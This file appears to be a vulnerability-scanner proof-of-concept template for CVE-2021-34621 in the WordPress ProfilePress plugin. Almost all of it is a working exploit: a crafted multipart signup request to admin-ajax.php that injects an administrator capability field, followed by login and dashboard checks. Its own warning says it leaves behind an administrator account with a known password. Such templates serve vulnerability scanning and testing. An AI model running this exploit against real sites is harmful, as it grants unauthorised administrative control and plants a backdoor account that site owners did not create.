name: poc-yaml-wordpress-profilepress-cve-2021-34621-unauth
manual: true
transport: http
set:
    rboundary: randomLowercase(8)
    randomstr: randomLowercase(27)
    s1: randomLowercase(6)
    baseurl: request.url.scheme + "://" + request.url.host
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /wp-admin/admin-ajax.php
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
            body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"reg_username\"\r\n\r\n{{randomstr}}\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"reg_email\"\r\n\r\n{{randomstr}}@{{s1}}.com\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"reg_password\"\r\n\r\n{{randomstr}}@{{s1}}.com\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"reg_password_present\"\r\n\r\ntrue\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"reg_first_name\"\r\n\r\n{{randomstr}}@{{s1}}.com\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"reg_last_name\"\r\n\r\n{{randomstr}}@{{s1}}.com\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"_wp_http_referer\"\r\n\r\n/wp/?page_id=18\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"pp_current_url\"\r\n\r\n{{baseurl}}\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"wp_capabilities[administrator]\"\r\n\r\n1\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"signup_form_id\"\r\n\r\n1\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"signup_referrer_page\"\r\n\r\n\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\npp_ajax_signup\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"melange_id\"\r\n\r\n\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
            follow_redirects: false
        expression: response.status == 200 && response.headers["Content-Type"].contains("application/json") && response.body_string.contains("Registration successful")
    r1:
        request:
            cache: true
            method: POST
            path: /wp-login.php
            headers:
                Content-Type: application/x-www-form-urlencoded; charset=UTF-8
            body: log={{randomstr}}@{{s1}}.com&pwd={{randomstr}}@{{s1}}.com&wp-submit=Log+In
            follow_redirects: true
        expression: response.status == 200 && response.body_string.contains(baseurl)
    r2:
        request:
            cache: true
            method: GET
            path: /wp-admin/
        expression: response.status == 200 && response.body_string.contains("Welcome to your WordPress Dashboard")
expression: r0() && r1() && r2()
detail:
    author: Editor
    links:
        - http://packetstormsecurity.com/files/163973/WordPress-ProfilePress-3.1.3-Privilege-Escalation.html
    vulnerability:
        id: CT-154796
        level: critical
    warning: 会产生一个账号密码为{{randomstr}}@{{s1}}.com的管理员账号
